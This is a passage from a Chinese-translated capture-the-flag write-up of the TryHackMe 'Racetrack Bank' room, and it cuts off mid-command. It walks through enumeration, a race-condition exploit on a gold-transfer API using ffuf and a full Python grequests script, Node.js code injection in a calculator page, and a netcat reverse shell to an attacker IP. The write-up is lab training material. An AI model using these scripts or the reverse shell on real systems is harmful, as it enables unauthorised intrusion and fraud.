<html>
<head>
<title>TryHackMe: Racetrack Bank Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe:赛马场银行报道</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-racetrack-bank-writeup-879b6534b00a?source=collection_archive---------1-----------------------#2021-02-06">https://infosecwriteups.com/tryhackme-racetrack-bank-writeup-879b6534b00a?source=collection_archive---------1-----------------------#2021-02-06</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="47fe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">本文介绍了我在TryHackMe平台上创建的<strong class="jp ir">赛马场银行</strong>夺旗(CTF) <strong class="jp ir"> </strong>挑战赛、<strong class="jp ir"> </strong>免费房间<em class="kl"> deltatemporal </em>的方法。我在下面的参考资料中提供了TryHackMe平台的链接，供有兴趣尝试这款CTF的人使用。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi km"><img src="../Images/c1998551bf39525542a48fa88e48a842.png" data-original-src="https://miro.medium.com/v2/resize:fit:684/format:webp/1*CqPRphG75tsFkuv42N9j7A.png"/></div></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="5307" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">放弃</h1><p id="b466" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">我喜欢在一篇文章之前添加一个简短的免责声明，以鼓励人们在阅读本文之前尝试一下这个房间，因为在这篇文章中显然会有<strong class="jp ir">剧透</strong><strong class="jp ir"/>。我相信，如果你先自己尝试，然后在遇到困难或需要提示时再来写这篇文章，你会更喜欢CTF。因此，没有任何进一步的拖延，让我们开始吧！</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="0210" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">挑战简介</h1><p id="7c3f" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">以下描述由房间作者提供:</p><blockquote class="me mf mg"><p id="2761" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">侵入机器并捕获用户和根标志！很难，所以祝你好运。</p></blockquote></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="2916" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">列举</h1><p id="cb30" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">好的枚举是解决这个挑战的关键！我开始用<strong class="jp ir"> NMAP </strong>扫描目标机器，寻找任何打开的端口。</p><pre class="kn ko kp kq gt mk ml mm mn aw mo bi"><span id="90b4" class="mp lc iq ml b gy mq mr l ms mt">nmap -sV -sC -v -Pn -oN nmap_report 10.10.252.171</span></pre><p id="9e36" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">NMAP命令可以细分如下:</p><ul class=""><li id="e74a" class="mu mv iq jp b jq jr ju jv jy mw kc mx kg my kk mz na nb nc bi translated"><strong class="jp ir"> -Pn </strong>:禁用主机发现。</li><li id="27e4" class="mu mv iq jp b jq nd ju ne jy nf kc ng kg nh kk mz na nb nc bi translated"><strong class="jp ir"> -sV </strong>:对服务进行版本检测。</li><li id="0db7" class="mu mv iq jp b jq nd ju ne jy nf kc ng kg nh kk mz na nb nc bi translated"><strong class="jp ir"> -sC </strong>:使用NMAP提供的默认脚本执行脚本扫描。</li><li id="a9b2" class="mu mv iq jp b jq nd ju ne jy nf kc ng kg nh kk mz na nb nc bi translated"><strong class="jp ir"> -v </strong>:提供关于NMAP扫描的详细信息。</li><li id="de20" class="mu mv iq jp b jq nd ju ne jy nf kc ng kg nh kk mz na nb nc bi translated"><strong class="jp ir"> -oN </strong>:将扫描结果输出到文件。</li></ul><p id="0977" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">只有两个端口打开，端口22和端口80。</p><pre class="kn ko kp kq gt mk ml mm mn aw mo bi"><span id="9c6e" class="mp lc iq ml b gy mq mr l ms mt">PORT   STATE SERVICE VERSION<br/>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br/>| ssh-hostkey: <br/>|   2048 51:91:53:a5:af:1a:5a:78:67:62:ae:d6:37:a0:8e:33 (RSA)<br/>|   256 c1:70:72:cc:82:c3:f3:3e:5e:0a:6a:05:4e:f0:4c:3c (ECDSA)<br/>|_  256 a2:ea:53:7c:e1:d7:60:bc:d3:92:08:a9:9d:20:6b:7d (ED25519)<br/>80/tcp open  http    nginx 1.14.0 (Ubuntu)<br/>| http-methods: <br/>|_  Supported Methods: GET HEAD POST OPTIONS<br/>|_http-server-header: nginx/1.14.0 (Ubuntu)<br/>|_http-title: Racetrack Bank<br/>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></pre><p id="a886" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">进一步的扫描没有发现任何其他开放的端口。</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="4895" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">Web枚举</h1><p id="5817" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">我决定查看端口80上托管的是什么网站，并找到了网站<strong class="jp ir">赛马场银行</strong>的登录页面。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="nj nk di nl bf nm"><div class="gh gi ni"><img src="../Images/16a54739555fcfbfd34886e5374ffb42.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*av6aK2nygSOg0prp6B4bPg.png"/></div></div></figure><p id="e0e2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我用用户名鲍勃创建了一个账户，并登录了网站。在仪表板页面上，我看到以下消息:</p><blockquote class="me mf mg"><p id="099d" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">欢迎来到赛马场银行！为了让你开始，我们给了你1枚金币(我们真慷慨！).明智地使用它。</p></blockquote><p id="c3da" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">通过查看仪表板的页面源代码，我可以看到有一个链接指向一个名为<em class="kl">premiumfeatures.html</em>的页面，但是我无法查看该页面的内容，如下所示。</p><pre class="kn ko kp kq gt mk ml mm mn aw mo bi"><span id="9211" class="mp lc iq ml b gy mq mr l ms mt">&lt;li class="nav-item" id="premiumlink" style="display: none"&gt;                            &lt;a class="nav-link" href="<a class="ae nn" href="http://10.10.191.233/premiumfeatures.html" rel="noopener ugc nofollow" target="_blank">/premiumfeatures.html</a>"&gt;Premium Features&lt;/a&gt;                        <br/>&lt;/li&gt;</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi no"><img src="../Images/49fef911cab51a3288583bbc17bd7606.png" data-original-src="https://miro.medium.com/v2/resize:fit:608/format:webp/1*udS8X5N7HFlFsf-DdL4Mug.png"/></div></figure><p id="e007" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然而，该网站确实允许您花费<strong class="jp ir"> 10，000 </strong>黄金购买高级功能。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="nj nk di nl bf nm"><div class="gh gi np"><img src="../Images/ede92e57c42abeb01e8959c910a1d247.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lZeTcIuLO6JDwexekXNY6w.png"/></div></div></figure><p id="7c81" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">网站上最后一个有趣的活动是将黄金转移给另一个用户的功能，正如登录页面上的开篇注释所说。</p><blockquote class="me mf mg"><p id="64c2" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">欢迎来到赛马场银行，这家银行(即将)让您<strong class="jp ir">以极快的速度转账</strong>！</p></blockquote><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="nj nk di nl bf nm"><div class="gh gi nq"><img src="../Images/c613fa6f94ab8414554c2e0f623924f6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9Ff3Rfj6r1RF1c1WCgMlgg.png"/></div></div></figure><p id="8311" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该网站提供的主要功能的最终列表包括:</p><ol class=""><li id="9345" class="mu mv iq jp b jq jr ju jv jy mw kc mx kg my kk nr na nb nc bi translated">创建一个帐户</li><li id="4832" class="mu mv iq jp b jq nd ju ne jy nf kc ng kg nh kk nr na nb nc bi translated">登录页面</li><li id="a1c9" class="mu mv iq jp b jq nd ju ne jy nf kc ng kg nh kk nr na nb nc bi translated">仪表板/主页</li><li id="4dc8" class="mu mv iq jp b jq nd ju ne jy nf kc ng kg nh kk nr na nb nc bi translated">购买页面</li><li id="5047" class="mu mv iq jp b jq nd ju ne jy nf kc ng kg nh kk nr na nb nc bi translated">赠送黄金</li></ol><p id="eb7f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我决定试着测试一下我是否能把黄金寄到我用用户名<em class="kl"> John </em>创建的另一个账户。我以用户<em class="kl">鲍勃</em>的身份登录，并将我的1枚金币发给了<em class="kl">约翰</em>。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="nj nk di nl bf nm"><div class="gh gi ni"><img src="../Images/d94725713a31cdd595e94992174c4f50.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kRyzsBIZYJDdO8lLIYZS1w.png"/></div></div></figure><p id="4187" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我注销了用户<em class="kl"> Bob的</em>账户，并以用户<em class="kl"> John </em>的身份登录。我可以看到这奏效了，约翰现在有了两枚金牌。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi ns"><img src="../Images/ca0a3a28966c21a3eaab955d2c533684.png" data-original-src="https://miro.medium.com/v2/resize:fit:646/format:webp/1*DmF8t9UjCvzjVCH8Cp9yag.png"/></div></figure><p id="2b07" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我可以在技术上创建数千个帐户，并转移他们的1金，但这将需要太长的时间，显然不是获得优质功能的方式。</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="9af8" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">最初的立足点</h1><p id="d1bb" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">在这一点上，我开始使用不同的工具和技术来找出我可以在哪里获得一个初步的立足点。这可能是这个挑战中最难的部分，我花了一段时间才弄明白。我的第一个线索是在使用<strong class="jp ir"> BurpSuite </strong>拦截发送到目标服务器的流量时，在HTTP响应头中找到的。</p><pre class="kn ko kp kq gt mk ml mm mn aw mo bi"><span id="05aa" class="mp lc iq ml b gy mq mr l ms mt">HTTP/1.1 200 OK<br/>Server: nginx/1.14.0 (Ubuntu)<br/>Date: Sat, 06 Feb 2021 12:03:40 GMT<br/>Content-Type: text/html; charset=utf-8<br/>Connection: close<br/>X-Powered-By: Express  #### Interesting<br/>Cache-Control: no-store<br/>Content-Length: 3578</span></pre><p id="5bac" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> X-Powered-By </strong>割台实际上不做任何事情。这只是意味着express正在被使用，有点像由php 提供的<strong class="jp ir"> X-Powered头。Express.js在节点应用程序中大量用于处理路由URL。这可以被认为是信息泄露，可能会泄露可以洞察web应用程序攻击媒介的细节。因此，应该禁用标题。</strong></p><p id="dde5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个线索本身在这一点上并没有太大的意义，但它值得记下来以备后用。在花了更多的时间寻找最初的立足点后，我决定看看第一个提示。</p><blockquote class="me mf mg"><p id="cf2f" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">银行的名字暗示了什么？</p></blockquote><p id="90a2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">单独搜索<strong class="jp ir"> racetrack bank </strong>并没有真正的帮助，但是结合这个提示和网站正在使用<strong class="jp ir"> Express Node.js框架</strong>的知识，我决定寻找任何Node.js包，找到了一个与<strong class="jp ir"> racetrack完全匹配的包。</strong></p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi nt"><img src="../Images/020370617c1705f356840d0916543c37.png" data-original-src="https://miro.medium.com/v2/resize:fit:818/format:webp/1*qbJ_NDM9GLBWInt28DZ_rQ.png"/></div></figure><p id="b6e2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">包装的描述如下:</p><blockquote class="me mf mg"><p id="f7f3" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">Racetrack是一种确保所有异步调用都完成的方法，如果有任何一个调用没有完成，它还能找出问题出在哪里。</p><p id="661b" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">对于那些有一堆最后一个参数都是函数的方法的类来说，这样做是很容易的。否则，你必须在每个函数前加上一个跟踪钩子。</p><p id="8930" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">它仍然很原始。</p></blockquote><h2 id="f62b" class="mp lc iq bd ld nu nv dn lh nw nx dp ll jy ny nz lp kc oa ob lt kg oc od lx oe bi translated">什么是竞争条件？</h2><p id="0421" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">阅读包的描述，看起来竞争条件攻击是可能的，因为包使用异步调用，但是什么是竞争条件呢？</p><p id="04aa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">竞争条件是一种不希望出现的情况，当设备或系统试图同时执行两个或多个操作时，但由于设备或系统的性质，这些操作必须以正确的顺序正确完成。我在下面提供了一些例子来帮助更好地理解竞态条件。</p><p id="d36b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">现实世界的例子</strong>:</p><blockquote class="me mf mg"><p id="a37a" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">竞争条件的一个简单例子是电灯开关。在一些家庭中，有多个灯开关连接到一个普通的顶灯上。当使用这些类型的电路时，开关位置变得无关紧要。如果灯亮着，将任一开关从当前位置移开，灯就会熄灭。类似地，如果灯关闭，那么从其当前位置移动任一开关将打开灯。考虑到这一点，想象一下如果两个人试图同时用两个不同的开关打开灯会发生什么。一个指令可能会取消另一个指令，或者两个动作可能会使断路器跳闸。</p></blockquote><p id="f15f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">计算机科学举例</strong>:</p><blockquote class="me mf mg"><p id="4373" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">竞争条件通常与计算机科学联系在一起。在计算机内存或存储器中，如果几乎在同一时刻收到读写大量数据的命令，并且机器试图在仍在读取旧数据的同时覆盖旧数据的一部分或全部，则可能出现竞争情况。结果可能是以下一个或多个:计算机崩溃、“非法操作”、程序的通知和关闭、读取旧数据的错误或写入新数据的错误。如果指令的处理顺序不正确，也会出现争用情况。</p></blockquote><p id="603c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">安全漏洞</strong>:</p><blockquote class="me mf mg"><p id="e047" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">当两个或多个线程可以访问共享数据，并且它们试图同时更改它时，就会发生争用情况。因为线程调度算法可以随时在线程之间交换，所以您不知道线程尝试访问共享数据的顺序。因此，数据变化的结果取决于线程调度算法，即两个线程都“竞相”访问/改变数据。</p></blockquote><h2 id="eedd" class="mp lc iq bd ld nu nv dn lh nw nx dp ll jy ny nz lp kc oa ob lt kg oc od lx oe bi translated">竞争条件利用</h2><p id="0847" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">既然我们有了潜在的漏洞，下一步就是找出在哪里使用它以及如何使用它。我们知道，要使用高级功能，需要<strong class="jp ir"> 10，000 </strong>枚金币。我还知道，该网站允许一个用户给另一个用户黄金，这可能是一个种族条件可以被发现和利用。</p><p id="6391" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">理论上，通过同时发送多个POST请求，而不是一次发送一个POST请求，可以通过竞争条件利用这种功能。这可以通过使用<code class="fe of og oh ml b">ffuf</code>来利用。简单地创建一个长列表，在每个新行上包含数字<code class="fe of og oh ml b">1</code>，并将其传递给<code class="fe of og oh ml b">ffuf</code>，后者将使用它来模糊<code class="fe of og oh ml b">amount</code>参数。这是可行的，因为<code class="fe of og oh ml b">ffuf</code>将发送多个异步POST请求，而不等待响应。在下面的例子中，我正在进行一个POST请求，从<em class="kl"> Bob </em>向<em class="kl"> John </em>多次发送<strong class="jp ir"> 1 </strong> gold。</p><pre class="kn ko kp kq gt mk ml mm mn aw mo bi"><span id="ab70" class="mp lc iq ml b gy mq mr l ms mt"># Use the cookie value of the user who is sending the gold (i.e. Bob)</span><span id="71a6" class="mp lc iq ml b gy oi mr l ms mt"># Provide the username of the user receiving the gold (i.e. John)</span><span id="1d3c" class="mp lc iq ml b gy oi mr l ms mt">ffuf -c -u <a class="ae nn" href="http://10.10.191.233/api/givegold" rel="noopener ugc nofollow" target="_blank">http://10.10.191.233/api/givegold</a> -X POST -w list.txt -H "Content-Type: application/x-www-form-urlencoded" -b "connect.sid=s%3A7CIq41Z-A_cGJJU8vStveftvTRgIrqLO.bbmGM9sKC49oAQtYUrgHSS83qC8cuu4EYw6YjDLKN7Y" -d "user=John&amp;amount=FUZZ"</span></pre><p id="a8dc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">执行该命令后，我登录到用户John的帐户，我可以看到收到的黄金数量远远大于发送的指定数量，这证实了竞争条件漏洞的存在。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi oj"><img src="../Images/f47b50c1eaa023924def9ebd5d2ef61d.png" data-original-src="https://miro.medium.com/v2/resize:fit:678/format:webp/1*GvkcEHQEly-xcf2AoYm8pw.png"/></div></figure><p id="f1fb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我可以继续使用这种方法并增加发送的数量，但是因为我很懒，所以我决定创建一个简单的python脚本来自动完成这个过程😄。</p><p id="5f6a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个脚本用于将黄金从一个用户的帐户发送到赛道银行网站上的另一个用户的帐户。它利用了竞争条件漏洞，从而不是一次发送一个POST请求并等待响应(即同步)，而是同时发送多个POST请求(异步)。在对第一个请求的响应被发送回之前，这些请求都被单独处理，导致多个请求被处理，黄金被发送给用户。</p><blockquote class="me mf mg"><p id="1df3" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated"><strong class="jp ir">脚本使用说明:</strong></p><p id="734b" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">1.确保在网站上创建了两个独立的帐户，并且在下面的脚本中指定了凭据。</p><p id="7756" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">2.确保两个用户的帐户中至少有一枚金牌。</p><p id="1d0e" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">注意:确保IP地址设置正确。此外，每次用户登录或退出时，cookie都会发生变化，这由下面的脚本处理。</p></blockquote><p id="e700" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个脚本可能需要几分钟的时间来运行，但最终会给我们提供购买高级功能所需的黄金。</p><pre class="kn ko kp kq gt mk ml mm mn aw mo bi"><span id="b792" class="mp lc iq ml b gy mq mr l ms mt">#!/usr/bin/env python</span><span id="2b88" class="mp lc iq ml b gy oi mr l ms mt">import grequests<br/>import requests<br/>from bs4 import BeautifulSoup</span><span id="a6bd" class="mp lc iq ml b gy oi mr l ms mt"># Websites IP Address for your room.<br/>ip_address = "10.10.133.7"</span><span id="d9b3" class="mp lc iq ml b gy oi mr l ms mt"># Credentials for First Account created.<br/>user_1 = "John"<br/>pass_1 = "password"</span><span id="09af" class="mp lc iq ml b gy oi mr l ms mt"># Credentials for Second Account created.<br/>user_2 = "Bob"<br/>pass_2 = "password"</span><span id="a3bd" class="mp lc iq ml b gy oi mr l ms mt"># Retrieve users cookie and current amount of gold.<br/>def userGoldAndCookie(username, password):<br/> # Details to be posted to the login form.<br/> payload = {<br/> 'username': username,<br/> 'password': password<br/> }<br/>    # Retrieve Gold Amount and Cookie for the specified user.<br/> with requests.Session() as s:<br/>  # Login as the specified user.<br/>  p = s.post('<a class="ae nn" href="http://{}/api/login'.format(ip_address)," rel="noopener ugc nofollow" target="_blank">http://{}/api/login'.format(ip_address),</a> data=payload)<br/>  # Get the amount of gold for the specified user.<br/>  gold_amount = 0<br/>  soup = BeautifulSoup(p.text, "html.parser")<br/>  for tag in soup.find_all('a'):<br/>   if "Gold:" in tag.text:<br/>    gold_amount = int(str(tag.text).split(":", 1)[1].strip())<br/>    print("Current Gold Amount for User {}: {}".format(username, gold_amount))</span><span id="fb12" class="mp lc iq ml b gy oi mr l ms mt"># Get the new cookie generated for the user.<br/>  cookie_dict = s.cookies.get_dict()<br/>  return cookie_dict['connect.sid'], gold_amount</span><span id="e00e" class="mp lc iq ml b gy oi mr l ms mt"># Function is used to send gold to a user.<br/>def sendGold(user, cookie, amount):<br/> print("Sending {} gold to user {}".format(amount, user))<br/> # Websites URL used to give gold to another user.<br/> url = '<a class="ae nn" href="http://{}/api/givegold'.format(ip_address)" rel="noopener ugc nofollow" target="_blank">http://{}/api/givegold'.format(ip_address)</a></span><span id="a68f" class="mp lc iq ml b gy oi mr l ms mt"># Network POST Request Headers<br/> headers = {<br/> "Host" : "{}".format(ip_address),<br/> "Referer" : "<a class="ae nn" href="http://{}/giving.html" rel="noopener ugc nofollow" target="_blank">http://{}/giving.html</a>".format(ip_address),<br/> "Content-Type" : "application/x-www-form-urlencoded",<br/> "Connection" : "close",<br/> "Cookie" : "connect.sid={}".format(cookie),<br/> "Upgrade-Insecure-Requests" : "1"<br/> }<br/>    <br/>    # The cookie of the user sending the gold<br/> cookies = {<br/> "connect.sid" : cookie<br/> }</span><span id="6747" class="mp lc iq ml b gy oi mr l ms mt"># N.B. Need to use data instead of params for a POST Request<br/> # This will send multiple POST requests, giving John 1000 gold in each POST request.<br/> data = "user={}&amp;amount={}".format(user,amount)</span><span id="3802" class="mp lc iq ml b gy oi mr l ms mt"># Send asynchronous post requests<br/> rs = (grequests.post(url, data=data, cookies=cookies, headers=headers) for i in range(0,100))<br/> requests = grequests.map(rs)<br/> print("{} gold has been sent to user {}!".format(amount, user))</span><span id="d9fa" class="mp lc iq ml b gy oi mr l ms mt">gold_needed = 0<br/>counter = 1</span><span id="606a" class="mp lc iq ml b gy oi mr l ms mt">while gold_needed &lt; 10000:<br/> if counter % 2 == 0:<br/>  print("{} turn to send gold...".format(user_1))<br/>  values = userGoldAndCookie(user_1, pass_1)<br/>  gold_needed = values[1]<br/>  sendGold(user_2, values[0], values[1])<br/>  counter += 1<br/> else:<br/>  print("{} turn to send gold...".format(user_2))<br/>  values = userGoldAndCookie(user_2, pass_2)<br/>  gold_needed = values[1]<br/>  sendGold(user_1, values[0], values[1])<br/>  counter += 1</span></pre><p id="d584" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行这个脚本后，我终于获得了足够的金币来购买高级功能。</p><pre class="kn ko kp kq gt mk ml mm mn aw mo bi"><span id="f5f8" class="mp lc iq ml b gy mq mr l ms mt">John turn to send gold...<br/>Current Gold Amount for User John: 16000<br/>Sending 16000 gold to user Bob<br/>16000 gold has been sent to user Bob!<br/>Success!! We have all the gold we need ;)</span></pre></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h2 id="8f49" class="mp lc iq bd ld nu nv dn lh nw nx dp ll jy ny nz lp kc oa ob lt kg oc od lx oe bi translated">Node.js远程代码执行(RCE)</h2><p id="49c2" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">购买高级功能后，我可以访问一个显示以下消息的新页面。</p><blockquote class="me mf mg"><p id="7704" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">这是我们惊人的高级功能:一个计算器！这么有用！</p><p id="2047" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">输入计算，例如1+1，它会告诉你答案！</p><p id="ce78" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">计算</p></blockquote><p id="9270" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因为我已经知道Node.js正在被使用，所以我尝试使用Node.js编程语言来执行RCE:</p><pre class="kn ko kp kq gt mk ml mm mn aw mo bi"><span id="3445" class="mp lc iq ml b gy mq mr l ms mt">process.cwd()</span></pre><p id="8846" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是可行的，我们可以在服务器上执行代码。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="nj nk di nl bf nm"><div class="gh gi ok"><img src="../Images/28fe86b22733f6be17fe88c3e886e078.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*f7ag97ed95F-YsWT3XJlqQ.png"/></div></div></figure><p id="5eba" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我使用下面的Node.js代码创建了一个反向shell:</p><pre class="kn ko kp kq gt mk ml mm mn aw mo bi"><span id="c4ec" class="mp lc iq ml b gy mq mr l ms mt">require("child_process").exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc IP_ADDRESS 4444 